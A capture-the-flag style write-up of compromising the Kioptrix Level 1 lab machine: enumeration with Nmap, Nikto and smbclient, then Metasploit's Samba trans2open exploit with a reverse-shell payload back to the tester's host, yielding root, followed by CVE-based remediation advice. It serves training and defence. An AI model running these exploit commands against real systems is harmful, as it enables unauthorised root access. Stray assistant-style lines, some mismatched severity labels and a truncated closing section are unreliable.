
# Kioptrix.level1 using Metasploit

Kioptrix Level 1 is a beginner-friendly vulnerable Linux machine originally created for learning penetration testing and exploitation techniques. The goal is to identify exposed services, enumerate potential vulnerabilities, gain initial access to the target system, and ultimately obtain root privileges.

This machine is widely used by aspiring penetration testers to practice a complete attack lifecycle, including reconnaissance, service enumeration, vulnerability assessment, exploitation, and privilege escalation. In this writeup, the compromise is achieved using the Metasploit Framework (in this write-up) to exploit a vulnerable network service and gain administrative access to the target host.

Link: https://www.vulnhub.com/entry/kioptrix-level-1-1,22/

# Table of Contents

* [Methodoloy and Mindset](#methodology-and-mindset)
* [Reconnaissance](#reconnaissance)
* [Web Enumeration with Nikto](#web-enumeration-with-nikto)
* [Enumerating SMB](#enumerating-smb)
* [Key Findings from Reconnaissance and Enumeration](#key-findings-from-reconnaissance-and-enumeration)
* [Exploitation](#exploitation)
  * [Potential Attack Surface #1 - mod_ssl 2.8.4](#potential-attack-surface-1---mod_ssl-284)
  * [Potential Attack Surface #2 - Samba 2.2.1a](#potential-attack-surface-2---samba-221a)
  * [Exploiting Samba trans2open](#exploiting-samba-trans2open)
* [Vulnerability Asssessment and Remediation](#vulnerability-asssessment-and-remediation)
* [Key Takeaways - Step-by-Step Summary](#key-takeaways---step-by-step-summary)
* [Overall Summary](#overall-summary)

## Methodology and Mindset

This writeup is intended to demonstrate the thought process of a penetration tester rather than simply providing a sequence of commands that lead directly to root access.

One of the reasons Kioptrix Level 1 remains a popular practice machine is that it contains multiple attack paths that can ultimately result in full system compromise. Rather than immediately selecting a known exploit, the goal of this assessment is to approach the target as if no prior knowledge exists and allow the information gathered during enumeration to guide the next steps.

Throughout the engagement, we will follow a structured penetration testing methodology:

1. **Reconnaissance** – Identify the target and discover exposed services.
2. **Enumeration** – Gather as much information as possible about those services, versions, and potential weaknesses.
3. **Vulnerability Assessment** – Analyze the collected information to identify possible attack vectors.
4. **Exploitation** – Use the most promising avenue to gain initial access.
5. **Privilege Escalation** – Escalate privileges until full administrative (root) access is achieved.
6. **Post-Exploitation** – Verify the compromise and understand the impact.

At each stage, different tools will be used to answer a single question:

> **"What opportunities does the information gathered so far present?"**

Instead of treating tools such as Nmap, Nikto, Metasploit, searchsploit, or manual enumeration techniques as solutions, they should be viewed as methods of discovering additional information. The findings from one phase will determine which tool or technique is used next.

This approach mirrors real-world penetration testing, where success depends less on knowing a specific exploit and more on understanding how to systematically identify, investigate, and validate potential attack paths.

The objective of this writeup is therefore not only to compromise the Kioptrix Level 1 machine, but also to illustrate the decision-making process that leads from initial reconnaissance to root access.

## Pre-requiste Information

The following information are provided before for the readers to have an easier grasp of the respective machines:

Target IP: 192.168.126.129\
Host IP: 192.168.126.128
# Reconnaissance

## Step 1: Host Discovery

The first step was to identify the IP address of the target machine on the local network. This can be accomplished using tools such as **Netdiscover** or **Nmap**.

### Option 1: Using Netdiscover

```bash
sudo netdiscover -r 192.168.126.0/24
```

### Option 2: Using Nmap Ping Sweep

```bash
nmap -sn 192.168.126.0/24
```

### Results
![scan_netdiscover](https://github.com/WNobsi/kioptrix.level1-using-Metaploit/blob/822c8831e5736c94d5e395847499ddc98bea3638/images/scan_netdiscover.png)

![scan_nmap_iprange](https://github.com/WNobsi/kioptrix.level1-using-Metaploit/blob/822c8831e5736c94d5e395847499ddc98bea3638/images/scanning_nmap.png)

After scanning the subnet, the target machine was identified with the following IP address:

```text
192.168.126.129
```

This IP address will be used throughout the remainder of the assessment for enumeration and exploitation.

## Step 2: Scanning for open ports

After we have identified the IP for the victim machine, we head to Nmap again to scout for open ports.

```bash
nmap -sS -T4 -p- -A 192.168.126.129
```



### Results
![scanning_nmap_open_ports](https://github.com/WNobsi/kioptrix.level1-using-Metaploit/blob/822c8831e5736c94d5e395847499ddc98bea3638/images/scan_nmap.png)

#### Scan Options

| Flag  | Description                                                                |
| ----- | -------------------------------------------------------------------------- |
| `-sS` | TCP SYN Scan                                                               |
| `-T4` | Faster scan timing                                                         |
| `-p-` | Scan all 65,535 TCP ports                                                  |
| `-A`  | Aggressive scan (OS detection, version detection, NSE scripts, traceroute) |

---

#### Scan Summary

* Host is alive
* 65,529 TCP ports closed
* 6 TCP ports open

| Port  | Service | Version            |
| ----- | ------- | ------------------ |
| 22    | SSH     | OpenSSH 2.9p2      |
| 80    | HTTP    | Apache 1.3.20      |
| 111   | RPCBind | RPC Service        |
| 139   | SMB     | Samba              |
| 443   | HTTPS   | Apache 1.3.20 SSL  |
| 32768 | Status  | RPC Status Service |

---

## Port Analysis

### Port 22 - SSH

```text
22/tcp open ssh OpenSSH 2.9p2 (protocol 1.99)
```

#### Observations

* OpenSSH version 2.9p2
* Supports both SSHv1 and SSHv2
* SSHv1 is deprecated and considered insecure

#### Potential Opportunities

* Username enumeration
* Credential attacks (if valid credentials are discovered later)
* Research for historical vulnerabilities affecting this version

---

### Port 80 - HTTP

```text
80/tcp open http Apache httpd 1.3.20
```

#### Observations

* Apache 1.3.20 running on Red Hat Linux
* Default Apache test page present
* TRACE method enabled

### Interesting Findings

```text
Potentially risky methods: TRACE
```

Default web pages often indicate:

* Minimal configuration
* Hidden directories
* Backup files
* Administrative interfaces

### Port 111 - RPCBind

```text
111/tcp open rpcbind
```

#### Observations

RPC services are commonly associated with:

* NFS
* Legacy Linux services
* Remote procedure call frameworks

#### Potential Opportunities

* Information disclosure
* NFS share discovery
* Service enumeration

---

### Port 139 - SMB (Samba)

```text
139/tcp open netbios-ssn
Samba smbd (workgroup: MYGROUP)
```

#### Observations

* Samba service detected
* Workgroup: MYGROUP

#### Potential Opportunities

SMB services are frequently valuable during assessments because they may reveal:

* Shared folders
* Usernames
* Misconfigurations
* Anonymous access

---

### Port 443 - HTTPS

```text
443/tcp open ssl/https
Apache/1.3.20
```

#### Observations

* Same Apache version as HTTP
* SSLv2 supported
* Multiple weak SSL ciphers enabled

#### Interesting Findings

* Expired certificate
* Self-signed certificate
* Default hostname

These indicators suggest a very old or intentionally vulnerable environment.

---

### Port 32768 - RPC Status

```text
32768/tcp open status
```

#### Observations

RPC Status Service detected:

```text
status (RPC #100024)
```

#### Potential Opportunities

* Additional RPC enumeration
* Discovery of related services
* NFS-related information gathering

---

### Additional Nmap Findings

#### Operating System Detection

```text
Linux Kernel 2.4.9 - 2.4.18
```

#### Observations

* Extremely old Linux kernel
* Potentially vulnerable to historical kernel exploits
* Indicates a legacy system

---

### SSL Configuration

#### Supported Protocols

```text
SSLv2 Supported
```

### Weak Ciphers Detected

* SSL2_RC2_128_CBC_WITH_MD5
* SSL2_RC4_128_EXPORT40_WITH_MD5
* SSL2_DES_64_CBC_WITH_MD5
* SSL2_RC4_64_WITH_MD5
* SSL2_DES_192_EDE3_CBC_WITH_MD5

These ciphers are obsolete and no longer considered secure.

---


## Pentester's Assessment of NMAP scan

At this stage, the objective is not exploitation but identifying the most promising attack surfaces.

Based on the reconnaissance results, the likely order of investigation would be:

- SMB (Port 139)
- Web Services (Ports 80 and 443)
- RPC Services (Ports 111 and 32768)
- SSH (Port 22) 

The scan reveals multiple outdated services, suggesting there may be several valid paths to compromise the target. The next phase should focus on thorough enumeration of each exposed service before attempting exploitation.---

# Enumerating HTTP and HTTPS (Port 80 and 443)

## Web Enumeration with Nikto

After identifying the available web services during the Nmap phase, the next step is to perform vulnerability and configuration analysis of the web server using Nikto.

```bash
nikto -h http://192.168.126.129
```
![enum_http_nikto](https://github.com/WNobsi/kioptrix.level1-using-Metaploit/blob/822c8831e5736c94d5e395847499ddc98bea3638/images/enum_http1.png)

#### Target Information

| Field           | Value           |
| --------------- | --------------- |
| Target IP       | 192.168.126.129 |
| Port            | 80              |
| Platform        | Linux/Unix      |
| Web Server      | Apache/1.3.20   |
| SSL Module      | mod_ssl/2.8.4   |
| OpenSSL Version | OpenSSL/0.9.6b  |

---

#### Server Information

Identified the following server banner:

```text
Apache/1.3.20 (Unix) (Red-Hat/Linux)
mod_ssl/2.8.4
OpenSSL/0.9.6b
```

#### Initial Observations

All three major components appear significantly outdated:

| Component | Version |
| --------- | ------- |
| Apache    | 1.3.20  |
| mod_ssl   | 2.8.4   |
| OpenSSL   | 0.9.6b  |

This immediately suggests a legacy web stack that may contain publicly documented vulnerabilities.

---

### ETag Information Disclosure

```text
Server may leak inodes via ETags
```

#### Finding

The server exposes ETag values that may disclose:

* Inode numbers
* File sizes
* Modification timestamps

#### Associated Vulnerability

```text
CVE-2003-1418
```

#### Impact

This information can help an attacker gather details about the underlying filesystem and server structure.

---

### Outdated Apache Version

```text
Apache/1.3.20 appears to be outdated
```

#### Observations

The detected version is significantly older than supported Apache releases.

Nikto further reports historical vulnerabilities affecting Apache 1.3.x including:

* Remote Denial of Service vulnerabilities
* Local buffer overflow vulnerabilities
* Potential code execution conditions in vulnerable configurations

#### Assessment

The presence of Apache 1.3.20 indicates a potentially vulnerable web server that warrants further investigation.

---

### mod_ssl 2.8.4 Analysis

#### High-Value Finding

One of the most interesting results from the Nikto scan is the presence of:

```text
mod_ssl/2.8.4
```

```text
mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow which may allow a remote shell.
```

#### Why This Matters

The installed version:

```text
mod_ssl 2.8.4
```

Historically, older versions of mod_ssl suffered from multiple security issues, including buffer overflow vulnerabilities that could potentially lead to:

* Remote code execution
* Arbitrary command execution
* Remote shell access
* Full server compromise

#### Pentester's Perspective

When encountering an outdated Apache installation, attention should immediately shift toward the SSL implementation.

The combination of:

```text
Apache 1.3.20
mod_ssl 2.8.4
OpenSSL 0.9.6b
```

represents a historically significant attack surface and is often one of the first areas security researchers investigate on legacy Linux systems.

This finding should be considered one of the most promising avenues discovered during web enumeration.

---

### OpenSSL 0.9.6b Analysis

Nikto identified:

```text
OpenSSL/0.9.6b appears to be outdated
```

#### Observations

The detected OpenSSL version is extremely old and predates many modern security improvements.

#### Potential Risks

Older OpenSSL versions may be susceptible to:

* Memory handling vulnerabilities
* Weak cryptographic implementations
* SSL/TLS protocol weaknesses
* Information disclosure vulnerabilities

#### Assessment

Combined with the outdated Apache and mod_ssl versions, this significantly increases the overall risk profile of the web server.

---

### Missing Security Headers

Nikto reported several missing security headers:

```text
Content-Security-Policy
Permissions-Policy
Strict-Transport-Security
Referrer-Policy
X-Content-Type-Options
```

#### Impact

The absence of these headers may increase exposure to:

* Content injection attacks
* MIME-type confusion attacks
* Clickjacking-related issues
* Information leakage through referrer headers

While common on older systems, their absence further highlights the age of the server configuration.

---

### HTTP Methods

Nikto identified the following allowed methods:

```text
GET
HEAD
OPTIONS
TRACE
```

#### Important Finding

```text
TRACE Method Enabled
```

Nikto reports:

```text
HTTP TRACE method is active and replies with suggestions that the host is vulnerable to XST.
```

#### Impact

TRACE can potentially be abused for:

* Cross-Site Tracing (XST)
* Header disclosure
* Debugging information leakage

Although not always directly exploitable, TRACE is generally considered unnecessary and should typically be disabled.

---

## Pentester's Assessment of Nikto scan

The Nikto scan paints a picture of a heavily outdated web server stack running:

```text
Apache 1.3.20
mod_ssl 2.8.4
OpenSSL 0.9.6b
```

The most significant findings include:

- Outdated Apache 1.3.20 installation
- Outdated OpenSSL 0.9.6b implementation
- Potentially vulnerable mod_ssl 2.8.4 module
- TRACE method enabled
- Directory indexing enabled
- Accessible Apache documentation and default files
- Presence of a potentially interesting `test.php` page

From a penetration testing perspective, the **mod_ssl 2.8.4 finding stands out as the most promising discovery** because it falls within a historically vulnerable version range associated with remote buffer overflow vulnerabilities and potential remote code execution scenarios.

When we google for mod_ssl/2.8.4 exploit. 
We find:

- https://www.exploit-db.com/exploits/21671

- https://github.com/heltonWernik/OpenLuck


# Enumerating SMB

During the initial Nmap reconnaissance, SMB services were identified on port **139/tcp**. Since SMB is frequently a valuable source of information disclosure and potential attack vectors, further enumeration was performed using Metasploit's SMB version scanner.

### SMB Version Enumeration

#### Metasploit Module

```bash
msfconsole
search /scanner/smb/
use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.126.129
run
```
---

## Scan Results
![enum_msf_smb_scan](https://github.com/WNobsi/kioptrix.level1-using-Metaploit/blob/822c8831e5736c94d5e395847499ddc98bea3638/images/msf_scan_smb.png)

### Output

```text
192.168.126.129:139 - Host could not be identified: Unix (Samba 2.2.1a)
```

### Summary

| Field            | Value           |
| ---------------- | --------------- |
| Target Host      | 192.168.126.129 |
| Target Port      | 139             |
| Service          | SMB             |
| Operating System | Unix            |
| SMB Software     | Samba           |
| Samba Version    | 2.2.1a          |

---

### Samba Version Analysis

Nikto and Nmap previously revealed that the target system is running several legacy services. This SMB enumeration further confirms that the target is running an extremely old version of Samba.

Detected Version:

```text
Samba 2.2.1a
```

### Initial Observations

* Samba version is significantly outdated.
* Running on a Unix/Linux host.
* Falls within a range of historically vulnerable Samba releases.
* Likely installed as part of the original operating system build rather than a modern package update.

---

### Why This Finding Is Important

SMB services are often among the most valuable enumeration targets because they can provide:

* Shared directories
* User account information
* Host configuration details
* Authentication weaknesses
* Known service vulnerabilities

In this case, the identified Samba version is particularly noteworthy due to its age.

### Historical Context

```text
Samba 2.2.1a
```

belongs to a generation of Samba releases that are no longer supported and have been associated with multiple security issues over time.

Older Samba deployments frequently expose:

* Anonymous shares
* Weak permissions
* Information disclosure
* Remote vulnerabilities
* Misconfigured authentication mechanisms

### SMB Share Enumeration with SMBClient

After identifying **Samba 2.2.1a**, SMB shares were enumerated using the `smbclient` utility to determine whether anonymous access was permitted.

#### Enumerating Available Shares

```bash
smbclient -L //192.168.126.129/
```
![enum_smbclient1](https://github.com/WNobsi/kioptrix.level1-using-Metaploit/blob/822c8831e5736c94d5e395847499ddc98bea3638/images/enum_smbclient1.png)
![enum_smbclient2](https://github.com/WNobsi/kioptrix.level1-using-Metaploit/blob/822c8831e5736c94d5e395847499ddc98bea3638/images/enum_smbclient2.png)
![enum_smbclient3](https://github.com/WNobsi/kioptrix.level1-using-Metaploit/blob/822c8831e5736c94d5e395847499ddc98bea3638/images/enum_smbclient3_ipc.png)

### Findings

Anonymous authentication was successful:

```text
Anonymous login successful
```

The following shares were discovered:

| Share Name | Type | Description                |
| ---------- | ---- | -------------------------- |
| IPC$       | IPC  | IPC Service (Samba Server) |
| ADMIN$     | IPC  | IPC Service (Samba Server) |

Additional information obtained:

| Property    | Value    |
| ----------- | -------- |
| Server Name | KIOPTRIX |
| Workgroup   | MYGROUP  |

### Observations

* SMB allows anonymous (null session) authentication.
* The host name was identified as **KIOPTRIX**.
* The system belongs to the **MYGROUP** workgroup.
* Presence of anonymous access confirms the Samba service is configured with relatively weak security settings.

---

### Accessing Individual Shares

#### ADMIN$ Share

```bash
smbclient //192.168.126.129/ADMIN$
```

Result:

```text
tree connect failed: NT_STATUS_WRONG_PASSWORD
```

The ADMIN$ share exists but does not allow anonymous access.

#### IPC$ Share

```bash
smbclient //192.168.126.129/IPC$
```

Result:

```text
Anonymous login successful
smb: \>
```

The IPC$ share was successfully accessed using anonymous authentication.

### smbclient Assessment

This enumeration confirms that the Samba server permits **null-session access** and exposes the **IPC$ share** without credentials. While ADMIN$ remains protected, anonymous access to IPC$ can often provide useful information during further SMB enumeration and reinforces the finding that the target is running a legacy Samba configuration with relaxed security controls.


---

### Pentester's Assessment

From a penetration testing perspective, SMB has emerged as one of the most promising attack surfaces discovered during reconnaissance.

The combination of:

- Samba 2.2.1a
- Anonymous SMB access
- Accessible IPC$ share
 - Legacy Linux environment

strongly suggests that SMB deserves continued investigation before pursuing exploitation through other services.

At this stage, SMB enumeration has already provided valuable intelligence about the target and may ultimately offer a direct path to compromise through either:

- Misconfigured shares
- Weak authentication controls
- Information disclosure
- Historical Samba vulnerabilities

Based on the evidence collected so far, SMB remains one of the highest-priority services for further enumeration alongside the vulnerable Apache/mod_ssl web stack.

---

# Key Findings from Reconnaissance and Enumeration

### Host Discovery

* Target identified as **192.168.126.129**.
* Host is running a **legacy Linux 2.4.x kernel**.

### Open Services Discovered

| Port  | Service    | Version                       |
| ----- | ---------- | ----------------------------- |
| 22    | SSH        | OpenSSH 2.9p2                 |
| 80    | HTTP       | Apache 1.3.20                 |
| 111   | RPCBind    | RPC Service                   |
| 139   | SMB        | Samba 2.2.1a                  |
| 443   | HTTPS      | Apache 1.3.20 + mod_ssl 2.8.4 |
| 32768 | RPC Status | RPC #100024                   |

### Critical Web Enumeration Findings

* Apache version **1.3.20** is severely outdated.
* **mod_ssl 2.8.4** falls within a historically vulnerable version range associated with remote buffer overflow vulnerabilities.
* **OpenSSL 0.9.6b** is outdated and potentially vulnerable.
* HTTP **TRACE** method is enabled.
* Accessible Apache documentation and default files discovered.
* Interesting file identified:

  * `/test.php`

### Critical SMB Enumeration Findings

* SMB service identified as **Samba 2.2.1a**.
* Anonymous (null-session) authentication allowed.
* Hostname discovered:

  * **KIOPTRIX**
* Workgroup identified:

  * **MYGROUP**
* Accessible SMB share:

  * **IPC$**
* Protected SMB share:

  * **ADMIN$**

### Security Weaknesses Identified

* SSH supports deprecated **SSHv1**.
* SSLv2 enabled with multiple weak ciphers.
* Expired self-signed SSL certificate.
* Multiple missing security headers.
* Legacy software versions present across all exposed services.

### Highest Value Attack Surfaces

1. **Apache + mod_ssl (Ports 80/443)** (Juicy)

   * Outdated Apache 1.3.20
   * Vulnerable mod_ssl 2.8.4
   * Weak OpenSSL implementation
 


2. **SMB / Samba (Port 139)** (Juiciest)

   * Samba 2.2.1a
   * Anonymous access permitted
   * IPC$ share accessible

3. **RPC Services (Ports 111 & 32768)** (Backup plan)

   * Potential for additional service enumeration and information disclosure

### Overall Assessment

The reconnaissance and enumeration phases reveal a deliberately outdated Linux environment exposing multiple legacy services. The strongest attack vectors identified are the **Apache/mod_ssl stack** and the **Samba 2.2.1a service with anonymous SMB access**, both of which warrant focused investigation during the exploitation phase.

---

# Exploitation

Following the reconnaissance and enumeration phases, the next step is to evaluate the discovered attack surfaces and determine whether any of the identified services are associated with known vulnerabilities or publicly available exploits.

Rather than attempting random attacks, a penetration tester should leverage the information gathered during enumeration to perform targeted research against the specific software versions identified on the target. This approach helps prioritize the most promising attack vectors and improves the likelihood of successful exploitation.

During our investigation, two services stood out due to their age, historical significance, and known vulnerability history:

* **Apache 1.3.20 with mod_ssl 2.8.4 and OpenSSL 0.9.6b**
* **Samba 2.2.1a**

Researching these versions revealed publicly documented vulnerabilities and exploit references that closely match the software identified during enumeration.

## Potential Attack Surface #1 - mod_ssl 2.8.4

The web server was found to be running:

```text
Apache 1.3.20
mod_ssl 2.8.4
OpenSSL 0.9.6b
```

During vulnerability research, the following references were identified:

* Exploit-DB: [https://www.exploit-db.com/exploits/21671](https://www.exploit-db.com/exploits/21671)
* OpenLuck Exploit: [https://github.com/heltonWernik/OpenLuck](https://github.com/heltonWernik/OpenLuck)

These resources describe vulnerabilities affecting legacy Apache/mod_ssl installations and provide proof-of-concept code capable of targeting vulnerable systems.

---

## Potential Attack Surface #2 - Samba 2.2.1a

SMB enumeration identified the target as:

```text
Unix (Samba 2.2.1a)
```

Research into this version revealed a well-known Samba vulnerability associated with the `trans2open` functionality.

Reference:

* Rapid7 Module: [https://www.rapid7.com/db/modules/exploit/linux/samba/trans2open/](https://www.rapid7.com/db/modules/exploit/linux/samba/trans2open/)

This vulnerability affects older Samba releases and has historically been leveraged to achieve remote code execution against vulnerable systems.

---

At this stage, both the **mod_ssl** and **Samba** attack surfaces appear viable candidates for exploitation. The following sections will evaluate each path individually, validate whether the target is vulnerable, and attempt to obtain an initial foothold on the system.

## Exploiting Samba `trans2open`

After identifying **Samba 2.2.1a** during the enumeration phase and confirming that a public Metasploit module existed for the `trans2open` vulnerability, the next step was to attempt exploitation.

### Selecting the Exploit Module

A search for available modules revealed multiple `trans2open` exploits for different operating systems:

```bash
search trans2open
```

The Linux-specific module was selected:

```bash
use exploit/linux/samba/trans2open
```
![](https://github.com/WNobsi/kioptrix.level1-using-Metaploit/blob/25b731beccbd3ef0d5f516a8ebf6a289a0c7d5ec/images/exploit_msf_trans2open2.png)
![](https://github.com/WNobsi/kioptrix.level1-using-Metaploit/blob/25b731beccbd3ef0d5f516a8ebf6a289a0c7d5ec/images/exploit_msf_trans2open3.png)
![](https://github.com/WNobsi/kioptrix.level1-using-Metaploit/blob/25b731beccbd3ef0d5f516a8ebf6a289a0c7d5ec/images/exploit_msf_trans2open4.png)



The target was then configured:

```bash
set RHOSTS 192.168.126.129
set LHOST 192.168.126.128
set LPORT 54321
```

---

## Initial Exploitation Attempt

By default, Metasploit selected the following payload:

```text
linux/x86/meterpreter/reverse_tcp
```

The exploit was executed:

```bash
exploit
```
![](https://github.com/WNobsi/kioptrix.level1-using-Metaploit/blob/25b731beccbd3ef0d5f516a8ebf6a289a0c7d5ec/images/exploit_msf_trans2open5.png)

#### Observations

The module began brute-forcing return addresses:

```text
Trying return address 0xbffffdfc...
Trying return address 0xbffffcfc...
Trying return address 0xbffffbfc...
```

Eventually, a Meterpreter session appeared to be created:

```text
Meterpreter session 5 opened
```

However, the session immediately died:

```text
Meterpreter session 5 closed. Reason: Died
Meterpreter session 6 closed. Reason: Died
```

After several attempts, the exploit was interrupted.

---

## Assessment of the Failure

At first glance, this may appear to be a failed exploit attempt, but it actually provided extremely valuable information.

### Important Observations

1. The target accepted the exploit.
2. The exploit reached code execution.
3. A session was created, albeit briefly.
4. The payload itself failed to execute reliably.

This distinction is critical.

The vulnerability was likely **successfully triggered**, but the chosen payload was incompatible with the target environment.

---

# Adapting the Approach

A common mistake during penetration testing is assuming that a failed payload means the target is not vulnerable.

Instead, we should ask:

> "Did the exploit fail, or did the payload fail?"

The dying Meterpreter sessions strongly suggested the latter.

Considering the age of the target:

* Linux Kernel 2.4.x
* Samba 2.2.1a
* Legacy userspace libraries

it is not unusual for staged Meterpreter payloads to encounter compatibility issues.

Therefore, instead of abandoning the exploit path, the payload strategy was adjusted.

---

## Switching to a Non-Staged Payload

The payload was changed from:

```text
linux/x86/meterpreter/reverse_tcp
```

to:

```text
linux/x86/shell_reverse_tcp
```

Configuration:

```bash
set payload linux/x86/shell_reverse_tcp
```

The exploit was executed once again:

```bash
exploit
```

![](https://github.com/WNobsi/kioptrix.level1-using-Metaploit/blob/25b731beccbd3ef0d5f516a8ebf6a289a0c7d5ec/images/exploit_msf_trans2open6.png)

---

## Successful Exploitation

This time, the exploit successfully established command shell sessions:

```text
Command shell session 7 opened
Command shell session 8 opened
Command shell session 9 opened
Command shell session 10 opened
```

Verifying access:

```bash
whoami
root
hostname
kioptrix.level1
```

Verifying with 'whoami' the user that we got access to is 'root', would mean we would need any privilege escalation and that the exploitation directly gives the root access of the machine.
And 'hostname' output as 'kioptrixx.level1' would confirm we broke into the correct machine.

The successful shell confirmed:

| Property | Value                       |
| -------- | --------------------------- |
| User     | root                        |
| Hostname | kioptrix.level1             |
| Exploit  | Samba trans2open            |
| Payload  | linux/x86/shell_reverse_tcp |
| Result   | Remote Root Shell           |

---

# Pentester's Assessment

This exploitation process highlights an important penetration testing mindset:

> A failed payload does not necessarily mean a failed exploit.

The initial Meterpreter sessions dying were actually a strong indicator that:

* The vulnerability existed.
* Code execution had likely been achieved.
* The payload was incompatible with the target environment.

Instead of abandoning the attack path, adapting to the target's age and constraints by switching to a simpler, non-staged payload ultimately resulted in successful remote code execution and an immediate **root shell**.

This demonstrates one of the most important lessons in penetration testing:

> **Enumeration provides direction, exploitation provides feedback, and adaptation turns partial success into full compromise.**

# Key Takeaways - Step-by-Step Summary

1. **Discovered the target host** on the local network and confirmed that it was alive.

2. **Performed a full Nmap scan** and identified six open ports:

   * 22 (SSH)
   * 80 (HTTP)
   * 111 (RPCBind)
   * 139 (SMB)
   * 443 (HTTPS)
   * 32768 (RPC Status)

3. **Identified multiple legacy services**, including:

   * Apache 1.3.20
   * mod_ssl 2.8.4
   * OpenSSL 0.9.6b
   * Samba 2.2.1a
   * OpenSSH 2.9p2

4. **Performed web enumeration using Nikto**, revealing:

   * Outdated web stack
   * TRACE method enabled
   * Directory indexing enabled
   * Accessible documentation and test files
   * Historically vulnerable mod_ssl version

5. **Performed SMB enumeration** using Metasploit and SMBClient, which revealed:

   * Samba 2.2.1a
   * Null-session access
   * Hostname: `KIOPTRIX`
   * Workgroup: `MYGROUP`
   * Accessible `IPC$` share

6. **Researched the discovered software versions** and identified publicly available exploits for:

   * mod_ssl 2.8.4
   * Samba `trans2open`

7. **Selected the Samba `trans2open` vulnerability** as the first exploitation path due to:

   * Matching version information
   * Anonymous SMB access
   * Reliable Metasploit module

8. **Attempted exploitation using the default Meterpreter payload**, which resulted in sessions opening and immediately dying.

9. **Adapted the approach by changing the payload** from:

   * `linux/x86/meterpreter/reverse_tcp`

   to:

   * `linux/x86/shell_reverse_tcp`

10. **Successfully obtained a remote root shell**, verifying:

    * User: `root`
    * Hostname: `kioptrix.level1`

---
You can add the following subsection under the **Critical Fixes** section in your `README.md`.

---

# Vulnerability Asssessment and Remediation

## 🔴 Priority 1 – Samba 2.2.1a (`trans2open`)

### Vulnerability

**Samba trans2open Remote Buffer Overflow**

* **CVE:** CVE-2003-0201
* **CVSS v3.1:** 9.8 (Critical)
* **CVSS Vector:** `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`

### Description

A buffer overflow vulnerability exists in the `call_trans2open()` function in Samba 2.2.x, allowing a remote, unauthenticated attacker to execute arbitrary code with root privileges.

### Impact

* Remote Code Execution (RCE)
* Unauthenticated exploitation
* Full system compromise
* Root shell access

### References

* NIST: [https://nvd.nist.gov/vuln/detail/CVE-2003-0201](https://nvd.nist.gov/vuln/detail/CVE-2003-0201)
* MITRE: [https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-0201](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-0201)
* Rapid7 Module: [https://www.rapid7.com/db/modules/exploit/linux/samba/trans2open/](https://www.rapid7.com/db/modules/exploit/linux/samba/trans2open/)
* Samba Advisory: [https://www.samba.org/samba/security/CAN-2003-0201.html](https://www.samba.org/samba/security/CAN-2003-0201.html)

### Remediation

* Upgrade to a supported Samba version (4.x or later).
* Disable anonymous SMB access.
* Restrict SMB exposure through firewall rules.

---

## 🔴 Priority 1 – Apache `mod_ssl` 2.8.4 / OpenSSL 0.9.6b

### Vulnerability

**Apache mod_ssl Remote Buffer Overflow (OpenFuck/OpenLuck)**

* **CVE:** CVE-2002-0082
* **CVSS v3.1:** 10.0 (Critical)
* **CVSS Vector:** `AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H`

### Description

A buffer overflow in Apache `mod_ssl` allows remote attackers to execute arbitrary code through crafted SSL requests. This is the vulnerability exploited by the well-known `OpenFuck` and `OpenLuck` exploits.

### Impact

* Remote Code Execution
* Unauthenticated attack vector
* Complete server compromise
* Potential privilege escalation to root

### References

* NIST: [https://nvd.nist.gov/vuln/detail/CVE-2002-0082](https://nvd.nist.gov/vuln/detail/CVE-2002-0082)
* MITRE: [https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0082](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0082)
* Exploit-DB: [https://www.exploit-db.com/exploits/21671](https://www.exploit-db.com/exploits/21671)
* OpenLuck Repository: [https://github.com/heltonWernik/OpenLuck](https://github.com/heltonWernik/OpenLuck)

### Remediation

* Upgrade to Apache HTTP Server 2.4.x.
* Upgrade to OpenSSL 3.x.
* Remove legacy `mod_ssl` versions entirely.

---

## 🔴 Priority 2 – SSLv2 Enabled

### Vulnerability

**SSLv2 Protocol Weaknesses**

SSLv2 itself encompasses several historical vulnerabilities. The most notable is:

* **CVE:** CVE-2016-0800 (DROWN)
* **CVSS v3.1:** 7.4 (High)
* **CVSS Vector:** `AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:L/A:L`

### Description

Servers supporting SSLv2 can be vulnerable to cryptographic attacks that allow attackers to decrypt encrypted communications.

### Impact

* Decryption of TLS sessions
* Man-in-the-middle attacks
* Disclosure of sensitive information

### References

* NIST: [https://nvd.nist.gov/vuln/detail/CVE-2016-0800](https://nvd.nist.gov/vuln/detail/CVE-2016-0800)
* DROWN Attack Website: [https://drownattack.com/](https://drownattack.com/)
* OpenSSL Advisory: [https://www.openssl.org/news/secadv/20160301.txt](https://www.openssl.org/news/secadv/20160301.txt)

### Remediation

Disable SSLv2 completely:

```apache
SSLProtocol all -SSLv2 -SSLv3
```

Allow only:

* TLS 1.2
* TLS 1.3

---

## 🟠 Priority 3 – OpenSSH 2.9p2 / SSHv1 Support

There is no single CVE that represents "SSHv1 enabled", as SSHv1 is considered fundamentally insecure and deprecated.

### Risk

* Weak cryptography
* Susceptible to session hijacking and MITM attacks
* Lack of modern authentication protections

### References

* OpenSSH Legacy Information: [https://www.openssh.com/legacy.html](https://www.openssh.com/legacy.html)
* RFC 4253 (SSH Protocol Version 2): [https://www.rfc-editor.org/rfc/rfc4253](https://www.rfc-editor.org/rfc/rfc4253)

### Remediation

```text
Protocol 2
```

Disable SSHv1 entirely and upgrade to a supported version of OpenSSH.

---

# Risk Prioritization Summary

| Priority    | Vulnerability            | CVE           | CVSS | Exploitable in Kioptrix   |
| ----------- | ------------------------ | ------------- | ---- | ------------------------- |
| 🔴 Critical | Samba trans2open RCE     | CVE-2003-0201 | 9.8  | ✅ Yes                     |
| 🔴 Critical | Apache mod_ssl RCE       | CVE-2002-0082 | 10.0 | Potentially               |
| 🔴 Critical | SSLv2 Weaknesses (DROWN) | CVE-2016-0800 | 7.4  | Configuration dependent   |
| 🟠 High     | SSHv1 Enabled            | N/A           | N/A  | Security Misconfiguration |

---

These references provide industry-standard identifiers (CVEs), severity scores (CVSS), and authoritative sources that can be included in your report to justify why the Samba and mod_ssl findings should be treated as **immediate remediation priorities** in a real-world environment.

# Overall Summary

This write-up reinforced one of the most important principles in penetration testing:

